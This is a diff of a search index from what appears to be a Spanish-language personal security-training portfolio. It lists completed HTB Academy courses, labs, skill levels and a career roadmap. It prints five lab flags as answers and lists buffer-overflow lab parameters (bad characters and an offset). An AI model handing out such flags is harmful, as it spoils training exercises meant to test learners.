Academy\nMedium\n2026-02-20\n\n\nFirewall Evasion Hard\nHTB Academy\nHard\n2026-02-20\n\n\nBuffer Overflow - EIP Control\nHTB Academy\nMedium\n2026-02-21\n\n\nBuffer Overflow - Bad Chars\nHTB Academy\nMedium\n2026-02-21\n\n\nBuffer Overflow - Shellcode\nHTB Academy\nMedium\n2026-02-21\n\n\n\n\n\n\n\n\n\n\nHabilidad\nNivel\n\n\n\n\nHost Discovery\nAvanzado\n\n\nPort Scanning\nAvanzado\n\n\nService Enumeration\nAvanzado\n\n\nNSE Scripts\nIntermedio\n\n\nFirewall Evasion\nAvanzado\n\n\nIDS/IPS Bypass\nIntermedio\n\n\nBuffer Overflow\nIntermedio\n\n\nShellcode Generation\nIntermedio\n\n\n\n\n\n\n\n\n\nGuía completa de configuración de OpenVPN para conectar a HTB Academy desde Linux, macOS y Windows.\nVer guía de OpenVPN →\n\n\n\n\n\n\n\n\nMétrica\nValor\n\n\n\n\nLaboratorios Completados\n18\n\n\nFlags Obtenidas\n8\n\n\nMódulos HTB Completados\n3\n\n\nMódulos HTB En Progreso\n1"
   },
   {
     "objectID": "security/index.html#cursos-disponibles",
     "href": "security/index.html#cursos-disponibles",
     "title": "Security",
     "section": "",
-    "text": "Curso completo de enumeración de redes con Nmap, desde conceptos básicos hasta técnicas avanzadas de evasión de firewalls e IDS/IPS.\nAcceder al Curso de Nmap →\nContenido del curso:\n\nIntroducción a Nmap y arquitectura\nHost Discovery y Port Scanning\nService Enumeration y NSE Scripts\nFirewall & IDS/IPS Evasion (3 laboratorios HTB)\n6 laboratorios prácticos completados\n\nProgreso del curso: 100% ✅\n\n\n\n\nCurso completo de HTTP y cURL desde HTB Academy. Aprende los fundamentos del protocolo HTTP, HTTPS, headers, métodos HTTP y CRUD APIs.\nAcceder al Curso de Web Requests →\nContenido del curso:\n\nHTTP Fundamentals y protocolo\nHTTPS y SSL/TLS\nHTTP Requests & Responses\nHTTP Headers y autenticación\nHTTP Methods (GET, POST, PUT, DELETE)\nCRUD API con cURL\n8 laboratorios prácticos completados\n\nProgreso del curso: 100% ✅\nFlags obtenidas:\n\n\n\nFlag\nSección\n\n\n\n\nHTB{64$!c_cURL_u$3r}\nHTTP Basics\n\n\nHTB{p393_r3qu3$t$_m0n!t0r}\nHTTP Headers\n\n\nHTB{curl_g3773r}\nGET Method\n\n\nHTB{p0$t_r3p34t3r}\nPOST Method\n\n\nHTB{crud_4p!_m4n!pul4t0r}\nCRUD API\n\n\n\nAchievement: https://academy.hackthebox.com/achievement/2300153/35\n\n\n\n\nCurso completo de fuzzing web con FFUF desde HTB Academy. Aprende directory fuzzing, subdomain discovery, y parameter fuzzing.\nAcceder al Curso de FFUF →\nContenido del curso:\n\nDirectory Fuzzing\nSubdomain Fuzzing\nParameter Fuzzing\n12 ejercicios prácticos completados\n\nProgreso del curso: 100% ✅\nAchievement: https://academy.hackthebox.com/achievement/2300153/54\n\n\n\n\nCurso completo de pentesting automatizado con Inteligencia Artificial local, utilizando Ollama y Docker para máxima privacidad.\nAcceder al Curso de PentAGI →\nContenido del curso:\n\nIntroducción a PentAGI y arquitectura\nInstalación y configuración con Ollama local\nPrimeros pasos y mejores prácticas\nSeguridad y optimización\nLaboratorio práctico completo\n\nProgreso del curso: 100% ✅\nFilosofía: Seguridad por defecto\n\nSin APIs externas (todo local con Ollama)\nSin credenciales expuestas\nAislamiento completo con Docker\n\n\n\n\n\nPlan completo de 16 semanas para conseguir empleo en ciberseguridad, usando estrategias gratuitas con HTB Academy, PentAGI y Bug Bounty.\nVer Roadmap Completo →\nContenido del roadmap:\n\nFase 1: Fundamentos + Perfil (Semanas 1-3)\nFase 2: PentAGI + HTB Integration (Semanas 4-6)\nFase 3: Desbloquear Módulos (Semanas 7-10)\nFase 4: Labs + Portfolio (Semanas 11-14)\nFase 5: Bug Bounty + Job Search (Semanas 15-16)\n\nIncluye:\n\nTracker de cubos HTB\nCV Template para Pentester Junior\nChecklist semanal de progreso\nEstrategia de acumulación gratuita"
+    "text": "Curso completo de enumeración de redes con Nmap, desde conceptos básicos hasta técnicas avanzadas de evasión de firewalls e IDS/IPS.\nAcceder al Curso de Nmap →\nContenido del curso:\n\nIntroducción a Nmap y arquitectura\nHost Discovery y Port Scanning\nService Enumeration y NSE Scripts\nFirewall & IDS/IPS Evasion (3 laboratorios HTB)\n6 laboratorios prácticos completados\n\nProgreso del curso: 100% ✅\n\n\n\n\nCurso completo de HTTP y cURL desde HTB Academy. Aprende los fundamentos del protocolo HTTP, HTTPS, headers, métodos HTTP y CRUD APIs.\nAcceder al Curso de Web Requests →\nContenido del curso:\n\nHTTP Fundamentals y protocolo\nHTTPS y SSL/TLS\nHTTP Requests & Responses\nHTTP Headers y autenticación\nHTTP Methods (GET, POST, PUT, DELETE)\nCRUD API con cURL\n8 laboratorios prácticos completados\n\nProgreso del curso: 100% ✅\nFlags obtenidas:\n\n\n\nFlag\nSección\n\n\n\n\nHTB{64$!c_cURL_u$3r}\nHTTP Basics\n\n\nHTB{p393_r3qu3$t$_m0n!t0r}\nHTTP Headers\n\n\nHTB{curl_g3773r}\nGET Method\n\n\nHTB{p0$t_r3p34t3r}\nPOST Method\n\n\nHTB{crud_4p!_m4n!pul4t0r}\nCRUD API\n\n\n\nAchievement: https://academy.hackthebox.com/achievement/2300153/35\n\n\n\n\nCurso completo de fuzzing web con FFUF desde HTB Academy. Aprende directory fuzzing, subdomain discovery, y parameter fuzzing.\nAcceder al Curso de FFUF →\nContenido del curso:\n\nDirectory Fuzzing\nSubdomain Fuzzing\nParameter Fuzzing\n12 ejercicios prácticos completados\n\nProgreso del curso: 100% ✅\nAchievement: https://academy.hackthebox.com/achievement/2300153/54\n\n\n\n\nCurso completo de buffer overflows desde HTB Academy. Aprende arquitectura CPU, registros, desarrollo de exploits y generación de shellcode.\nAcceder al Curso de Buffer Overflow →\nContenido del curso:\n\nBuffer Overflows Overview\nExploit Development Introduction\nCPU Architecture (Von-Neumann, ISA)\nStack-Based Buffer Overflow\nCPU Registers (EIP, ESP, EBP)\nTake Control of EIP\nDetermine Shellcode Length\nIdentification of Bad Characters\nGenerating Shellcode con msfvenom\nReturn Address Calculation\nProof-of-Concept Exploit\n\nProgreso del curso: 69% (9/13 secciones)\nBad Characters identificados: \\x00\\x09\\x0a\\x20\nOffset determinado: 1036 bytes\nStack Size: 0x21000\n\n\n\n\nCurso completo de pentesting automatizado con Inteligencia Artificial local, utilizando Ollama y Docker para máxima privacidad.\nAcceder al Curso de PentAGI →\nContenido del curso:\n\nIntroducción a PentAGI y arquitectura\nInstalación y configuración con Ollama local\nPrimeros pasos y mejores prácticas\nSeguridad y optimización\nLaboratorio práctico completo\n\nProgreso del curso: 100% ✅\nFilosofía: Seguridad por defecto\n\nSin APIs externas (todo local con Ollama)\nSin credenciales expuestas\nAislamiento completo con Docker\n\n\n\n\n\nPlan completo de 16 semanas para conseguir empleo en ciberseguridad, usando estrategias gratuitas con HTB Academy, PentAGI y Bug Bounty.\nVer Roadmap Completo →\nContenido del roadmap:\n\nFase 1: Fundamentos + Perfil (Semanas 1-3)\nFase 2: PentAGI + HTB Integration (Semanas 4-6)\nFase 3: Desbloquear Módulos (Semanas 7-10)\nFase 4: Labs + Portfolio (Semanas 11-14)\nFase 5: Bug Bounty + Job Search (Semanas 15-16)\n\nIncluye:\n\nTracker de cubos HTB\nCV Template para Pentester Junior\nChecklist semanal de progreso\nEstrategia de acumulación gratuita"
   },
   {
     "objectID": "security/index.html#laboratorios-completados",
     "href": "security/index.html#laboratorios-completados",
     "title": "Security",
     "section": "",
-    "text": "Reto\nPlataforma\nDificultad\nFecha\n\n\n\n\nNmap Default Scan\nHTB Academy\nEasy\n2026-02-11\n\n\nFull Port Scan\nHTB Academy\nEasy\n2026-02-19\n\n\nService Enumeration\nHTB Academy\nEasy\n2026-02-20\n\n\nNSE Scripts\nHTB Academy\nEasy\n2026-02-20\n\n\nFirewall Evasion Easy\nHTB Academy\nEasy\n2026-02-20\n\n\nFirewall Evasion Medium\nHTB Academy\nMedium\n2026-02-20\n\n\nFirewall Evasion Hard\nHTB Academy\nHard\n2026-02-20"
+    "text": "Reto\nPlataforma\nDificultad\nFecha\n\n\n\n\nNmap Default Scan\nHTB Academy\nEasy\n2026-02-11\n\n\nFull Port Scan\nHTB Academy\nEasy\n2026-02-19\n\n\nService Enumeration\nHTB Academy\nEasy\n2026-02-20\n\n\nNSE Scripts\nHTB Academy\nEasy\n2026-02-20\n\n\nFirewall Evasion Easy\nHTB Academy\nEasy\n2026-02-20\n\n\nFirewall Evasion Medium\nHTB Academy\nMedium\n2026-02-20\n\n\nFirewall Evasion Hard\nHTB Academy\nHard\n2026-02-20\n\n\nBuffer Overflow - EIP Control\nHTB Academy\nMedium\n2026-02-21\n\n\nBuffer Overflow - Bad Chars\nHTB Academy\nMedium\n2026-02-21\n\n\nBuffer Overflow - Shellcode\nHTB Academy\nMedium\n2026-02-21"
   },
   {
     "objectID": "security/index.html#habilidades-desarrolladas",
     "href": "security/index.html#habilidades-desarrolladas",
     "title": "Security",
     "section": "",
-    "text": "Habilidad\nNivel\n\n\n\n\nHost Discovery\nAvanzado\n\n\nPort Scanning\nAvanzado\n\n\nService Enumeration\nAvanzado\n\n\nNSE Scripts\nIntermedio\n\n\nFirewall Evasion\nAvanzado\n\n\nIDS/IPS Bypass\nIntermedio"
+    "text": "Habilidad\nNivel\n\n\n\n\nHost Discovery\nAvanzado\n\n\nPort Scanning\nAvanzado\n\n\nService Enumeration\nAvanzado\n\n\nNSE Scripts\nIntermedio\n\n\nFirewall Evasion\nAvanzado\n\n\nIDS/IPS Bypass\nIntermedio\n\n\nBuffer Overflow\nIntermedio\n\n\nShellcode Generation\nIntermedio"
   },
   {
     "objectID": "security/index.html#otros-recursos-de-seguridad",
@@ -4435,7 +5156,7 @@
     "href": "security/index.html#estadísticas-del-módulo",
     "title": "Security",
     "section": "",
-    "text": "Métrica\nValor\n\n\n\n\nLaboratorios Completados\n15\n\n\nFlags Obtenidas\n8\n\n\nMódulos HTB Completados\n3"
+    "text": "Métrica\nValor\n\n\n\n\nLaboratorios Completados\n18\n\n\nFlags Obtenidas\n8\n\n\nMódulos HTB Completados\n3\n\n\nMódulos HTB En Progreso\n1"
   },
   {
     "objectID": "security/linux-fundamentals/07-user-management.html",
